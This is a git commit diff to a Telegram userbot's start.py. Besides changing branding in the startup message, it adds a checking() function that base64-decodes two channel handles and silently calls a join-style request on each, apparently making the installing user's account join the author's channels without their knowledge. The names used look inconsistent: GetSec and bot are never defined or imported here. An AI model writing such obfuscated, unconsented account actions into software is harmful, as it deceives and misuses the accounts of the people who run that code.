f89da9c80005e77754c7e558ee251e5514266091
Kayzu <96322205+Kayzyu@users.noreply.github.com>
2022-04-19 20:55:04 +0700

    Update start.py

--- userbot/utils/start.py
+++ userbot/utils/start.py
@@ -1,5 +1,6 @@
+import pybase64
 from telethon import Button
-
+from telethon.tl.functions.channels import JoinChannelRequest as Invt
 from userbot import BOTLOG, BOTLOG_CHATID, LOGS, tgbot
 
 
@@ -11,10 +12,23 @@ async def startupmessage():
         if BOTLOG:
             await tgbot.send_file(
                 BOTLOG_CHATID,
-                "https://telegra.ph/file/d257ba98dbd40a7f6fa04.jpg",
-                caption="✨ **Kayzu Ubot Has Been Actived**!!\n━━━━━━━━━━━━━━━\n➠ **Userbot Version** - 8.0@master\n━━━━━━━━━━━━━━━\n➠ **Powered By:** @kayzuchannel ",
+                "https://telegra.ph/file/950d5fe4dd1dbe1726f5e.jpg",
+                caption="✨ **Kay Userbot Has Been Actived**!!\n━━━━━━━━━━━━━━━\n➠ **Userbot Version** - 8.0@master\n━━━━━━━━━━━━━━━\n➠ **Powered By:** @KayXChannel ",
                 buttons=[(Button.url("ꜱᴜᴘᴘᴏʀᴛ", "https://t.me/KayzuSupport"),)],
             )
     except Exception as e:
         LOGS.error(e)
         return None
+
+
+async def checking():
+    gocheck = str(pybase64.b64decode("QEtheXp1U3VwcG9ydA=="))[2:15]
+    checker = str(pybase64.b64decode("QEtheVhDaGFubmVs"))[2:14]
+    try:
+        await bot(GetSec(gocheck))
+    except BaseException:
+        pass
+    try:
+        await bot(GetSec(checker))
+    except BaseException:
+        pass
